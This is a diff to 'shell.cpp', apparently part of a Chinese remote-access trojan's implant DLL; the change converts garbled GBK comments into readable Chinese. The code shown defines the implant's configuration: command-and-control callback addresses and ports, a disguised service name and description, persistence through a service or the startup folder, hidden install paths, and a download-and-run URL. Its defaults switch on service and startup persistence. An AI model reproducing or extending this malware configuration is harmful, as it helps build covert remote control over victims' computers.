@@ -1,4 +1,4 @@
-// shell.cpp : Defines the entry point for the DLL application.
+﻿// shell.cpp : Defines the entry point for the DLL application.
 //
 
 #include "stdafx.h"
@@ -9,29 +9,29 @@
 #include <Shlobj.h>
 #include "ShellCode.h"
 #include "MemoryModule.h"
-//������Ϣ�ṹ��
+//配置信息结构体
 struct MODIFY_DATA
 {
-	TCHAR szDns1[300];      //���ߵ�ַ1
-	TCHAR szDns2[300];      //���ߵ�ַ2
-	DWORD dwPort1;          //���߶˿�1
-	DWORD dwPort2;          //���߶˿�2
-	TCHAR szGroup[50];      //���߷���
-	TCHAR szVersion[32];    //���߰汾
-	TCHAR SerName[100];     //��������
-	TCHAR Serdisplay[128];  //��ʾ����
-	TCHAR Serdesc[256];     //��������
-	TCHAR szGetGroup[256];  //����Ψһ��ʶ
-	BOOL  bLanPenetrate;    //�Ƿ�ʹ����������͸
-	BOOL  bService;         //�Ƿ��Ƿ�������
-	BOOL  bRuns;            //�Ƿ�������Ŀ¼����
-	BOOL  bRunOnce;         //�Ƿ�Ϊ��ɫ��װ
-	TCHAR ReleasePath[100]; //��װ;��
-	TCHAR ReleaseName[50];  //��װ����
-	WORD  Dele_zd;          //��װ����
-	WORD  FileAttribute;    //�ļ�����
-	BOOL Dele_Kzj;                //���߼�¼
-	TCHAR szDownRun[512];   //�������е�ַ
+	TCHAR szDns1[300];      //上线地址1
+	TCHAR szDns2[300];      //上线地址2
+	DWORD dwPort1;          //上线端口1
+	DWORD dwPort2;          //上线端口2
+	TCHAR szGroup[50];      //上线分组
+	TCHAR szVersion[32];    //上线版本
+	TCHAR SerName[100];     //服务名称
+	TCHAR Serdisplay[128];  //显示名称
+	TCHAR Serdesc[256];     //服务描述
+	TCHAR szGetGroup[256];  //分组唯一标识
+	BOOL  bLanPenetrate;    //是否使用了内网穿透
+	BOOL  bService;         //是否是服务启动
+	BOOL  bRuns;            //是否是启动目录启动
+	BOOL  bRunOnce;         //是否为绿色安装
+	TCHAR ReleasePath[100]; //安装途径
+	TCHAR ReleaseName[50];  //安装名称
+	WORD  Dele_zd;          //安装增大
+	WORD  FileAttribute;    //文件属性
+	BOOL Dele_Kzj;                //离线记录
+	TCHAR szDownRun[512];   //下载运行地址
 };
 
 MODIFY_DATA modify_data = 
@@ -46,10 +46,10 @@ MODIFY_DATA modify_data =
 	"",
 	"",
 	"",
-	FALSE,			//FALSEΪδʹ��������͸
-	TRUE,			//TRUEΪ��������
-	TRUE,			//TRUEΪ����Ŀ¼����
-	TRUE,			//TRUEΪ��ɫ��װ��FALSEΪ��׼��װ
+	FALSE,			//FALSE为未使用内网穿透
+	TRUE,			//TRUE为服务启动
+	TRUE,			//TRUE为启动目录启动
+	TRUE,			//TRUE为绿色安装，FALSE为标准安装
 	"",
 	"",
 	0,
